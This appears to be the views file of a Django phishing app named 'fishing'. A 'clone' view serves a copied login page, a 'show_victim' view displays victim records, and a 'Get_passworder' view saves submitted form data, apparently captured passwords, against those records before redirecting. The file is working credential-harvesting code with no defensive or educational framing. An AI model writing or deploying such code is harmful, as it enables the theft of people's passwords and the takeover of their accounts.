from django.shortcuts import render, get_object_or_404
from fishing.models import articles, author, Pokes
from fishing.forms import createForm
from django.contrib.auth.models import User
from django.http import HttpResponseRedirect, JsonResponse

# Create your views here.

def clone(request):
    poke = Pokes.objects.all().order_by('-id')[:1]
    
    ctx = {
      'poke': poke,
    }
    return render(request, 'home/clone.html', ctx)

# open home page
def index(request):
    
    profile = Pokes.objects.all().order_by('-id')

    context = {
    'profile': profile,
    }

    
    return render(request, 'home/index.html', context)  



# show the true link publish(details)
def show_article(request, id, slug):
 # show second article
    post = get_object_or_404(articles, id=id, slug = slug)
    art = articles.objects.get(pk = id, slug = slug)
   
    context = {
       'art': art,
      
       'post': post,
      
     
        }
   
   
  
    return render(request, 'home/profile_detail.html', context)

def show_victim(request, id, slug):
 # show second article
    post = get_object_or_404(Pokes, id=id, slug = slug)
    art = Pokes.objects.get(pk = id, slug = slug)
   
    context = {
       'art': art,
      
       'post': post,
      
     
        }
   
   
  
    return render(request, 'home/pokes_detail.html', context)
def Get_passworder(request):
   
    pokes = Pokes.objects.all().last()
    if request.method == 'POST':
      f = createForm(request.POST or None)
      if f.is_valid():
        c = f.save(commit = False)
        
        c.poke = pokes
        c.save()

   
    return HttpResponseRedirect('/user')




   